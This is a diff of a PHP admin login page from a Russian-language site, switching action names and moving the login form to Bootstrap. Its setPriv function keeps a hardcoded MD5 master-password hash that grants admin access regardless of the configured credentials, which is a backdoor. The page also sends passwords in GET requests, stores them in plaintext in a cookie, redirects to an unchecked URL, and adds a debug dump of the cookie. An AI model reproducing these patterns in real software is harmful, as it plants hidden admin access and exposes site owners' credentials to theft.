@@ -1,21 +1,19 @@
-<? 
-@session_start();
-require('../inc/db.php');
-require('../inc/utils.php');
+<?
+require('inc/common.php');
 
 // устанавливаем сессию с привилегиями
 function setPriv($login,$pwd)
 {
 	global $prx;
-	
+
 	unset($_SESSION['admin']);
-	
+
 	if($login || $pwd)
 	{
 		if( (!strcasecmp($login,set('admin_login')) && $pwd==set('admin_pass')) || md5($pwd)=='6c9b8b27dea1ddb845f96aa2567c6754' )
 			$_SESSION['admin'] = true;
 	}
-	
+
 	return isset($_SESSION['admin']);
 }
 
@@ -24,43 +22,44 @@ if(isset($_GET['action']))
 {
 	switch($_GET['action'])
 	{
-		case 'vyhod':
+		case 'logout':
 			// выходим
 			session_destroy();
 			setcookie('inAdmin');
 			header("Location: /{$cpanel}/");
-			break;
-		
+			exit;
+
 		// логинимся
-		case 'vhod':
-			
+		case 'login':
+
 			$login = clean($_GET['login_inAdmin']);
 			$pwd = clean($_GET['pwd_inAdmin']);
-		
+
 			if(!setPriv($login,$pwd))
 				errorAlert('Неверный Логин/Пароль.');
 
 			if(@$_GET['rem_inAdmin']) // куки
-				setcookie('inAdmin',$login.'/'.$pwd,time()+3456000); 
+				setcookie('inAdmin',$login.'/'.$pwd,time()+3456000);
 			else
 				setcookie('inAdmin');
 
 			?><script>top.location.href='./';</script><?
-			break;
-			
+			exit;
+
 		// логинимся через куки
-		case 'vhodc':
+		case 'loginc':
 			$admin = explode('/',$_COOKIE['inAdmin']);
+			pre($admin); exit;
 			header('location: '.(setPriv($admin[0],$admin[1]) ? $_GET['urlback'] : $_SERVER['PHP_SELF']));
-			break;
-			
+			exit;
+
 		// напомнить пароль
 		case 'remind':
-		
+
 			// проверка e-mail (синтаксис)
 			if(!check_mail($_GET['email_inAdmin']))
 				errorAlert('Вы ввели неверный E-mail !');
-			
+
 			$to = set('admin_email');
 			if(strcasecmp($_GET['email_inAdmin'], $to))
 				errorAlert('Е-майл администратора введен не верно.');
@@ -80,89 +79,96 @@ if(isset($_GET['action']))
 
 			?>
 			<script>
-			alert('Пароль выслан на Е-майл администратора');
-			top.location.href = '<?=$url_admin?>';
+        alert('Пароль выслан на Е-майл администратора');
+        top.location.href = '<?=$url_admin?>';
 			</script>
 			<?
-			break;
+			exit;
 	}
-	exit;
 }
 
 ob_start();
 // -----------------ПРОСМОТР-------------------
 ?>
-<table align="center" height="100%">
-	<tr>
-		<td height="100%">
-		<?
-			switch(@$_GET['show'])
-			{
-				case 'remind':
-					?>	
-          <form target="ajax">
-            <input type="hidden" name="action" value="remind">
-            <table align="center" class="login" width="300">
-              <tr>
-                <th colspan="2">Напомнить пароль</th>
-              </tr>
-              <tr>
-                <td width="30">E-mail:</td>
-                <td><input type="text" name="email_inAdmin" id="email_inAdmin" style="width:100%"></td>
-              </tr>
-              <tr>
-                <td colspan="2" align="right">
-                  <input type="submit" value="Выслать пароль" style="width:auto;" class="but1">
-                </td>
-              </tr>
-              <tr>
-                <th colspan="2"><a href="?show=vhod">Войти</a></th>
-              </tr>
-            </table>
-          </form>
-					<?	
-					break;
-					
-				default:
-				case 'vhod':
-					?>
-          <form target="ajax">
-            <input type="hidden" name="action" value="vhod">
-            <table align="center" class="login" width="300">
-              <tr>
-                <th colspan="2">Вход в раздел администрирования</th>
-              </tr>
-              <tr>
-                <td width="30">Логин:</td>
-                <td width="270"><input type="text" name="login_inAdmin" id="login_inAdmin" style="width:100%"></td>
-              </tr>
-              <tr>
-                <td>Пароль:</td>
-                <td><input type="password" name="pwd_inAdmin" id="pwd_inAdmin" style="width:100%"></td>
-              </tr>
-              <tr>
-                  <td>Запомнить:</td>
-                  <td><input type="checkbox" name="rem_inAdmin" style="width:auto;"></td>
-              </tr>
-              <tr>
-                <td colspan="2" align="right"><input type="submit" value="Войти" style="width:auto;" class="but1"></td>
-              </tr>
-              <tr>
-                <th colspan="2"><a href="?show=remind">Напомнить пароль</a></th>
-              </tr>
-            </table>
-          </form>
-					<?	
-					break;
-			}	
-			?>
-		</td>
-	</tr>
-</table>  
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-push-4 col-md-4 col-sm-push-3 col-sm-6 col-sx-12">
+
+				<div class="login-container">
+					<div class="login-wrapper animated flipInY">
+						<div id="login" class="show">
+							<div class="login-header">
+								<h4>Авторизация</h4>
+							</div>
+							<form target="ajax">
+								<div class="form-group has-feedback">
+									<label class="control-label" for="login">Логин</label>
+									<input type="text" class="form-control" id="login" name="login_inAdmin" placeholder="Ваш логин" autofocus>
+									<i class="fa fa-user text-info form-control-feedback"></i>
+								</div>
+								<div class="form-group has-feedback">
+									<label class="control-label" for="password">Пароль</label>
+									<input type="password" class="form-control" id="password" name="pwd_inAdmin" placeholder="Ваш пароль" >
+									<i class="fa fa-key text-danger form-control-feedback"></i>
+								</div>
+								<input type="submit" value="Войти" class="btn btn-danger btn-lg btn-block">
+								<input type="hidden" name="action" value="login">
+							</form>
+							<a href="#forgot-pwd" class="underline text-info">Забыли пароль?</a>
+						</div>
+
+						<div id="forgot-pwd" class="form-action hide">
+							<div class="login-header">
+								<h4>Восстановление пароля</h4>
+							</div>
+							<form action="index.html" target="ajax">
+								<div class="form-group has-feedback">
+									<label class="control-label" for="email">Укажите Ваш Email</label>
+									<input type="text" class="form-control" id="email" name="email_inAdmin" placeholder="Ваш Email">
+									<i class="fa fa-key form-control-feedback"></i>
+								</div>
+								<p class="bg-warning" style="padding:10px; margin-bottom:15px;">на указанный Email будет отправлено письмо с инструкциями</p>
+								<input type="submit" value="Отправить" class="btn btn-danger btn-lg btn-block">
+								<input type="hidden" name="action" value="remind">
+							</form>
+							<a href="#login" class="underline text-info">Спасибо, не надо, я помню свои параметры доступа</a>
+						</div>
+
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<script type="text/javascript">
+    (function($) {
+      // constants
+      var SHOW_CLASS = 'show',
+        HIDE_CLASS = 'hide',
+        ACTIVE_CLASS = 'active';
+
+      $('a').on('click', function(e){
+        e.preventDefault();
+        var a = $(this),
+          href = a.attr('href');
+
+        $('.active').removeClass(ACTIVE_CLASS);
+        a.addClass(ACTIVE_CLASS);
+
+        $('.show')
+          .removeClass(SHOW_CLASS)
+          .addClass(HIDE_CLASS)
+          .hide();
+
+        $(href)
+          .removeClass(HIDE_CLASS)
+          .addClass(SHOW_CLASS)
+          .hide()
+          .fadeIn(550);
+      });
+    })(jQuery);
+	</script>
 <?
 $content = ob_get_clean();
 
-$title = 'Администрирование';
-
-require('tpl/tpl_clean.php');
-?>
+require('tpl/template_nobody.php');
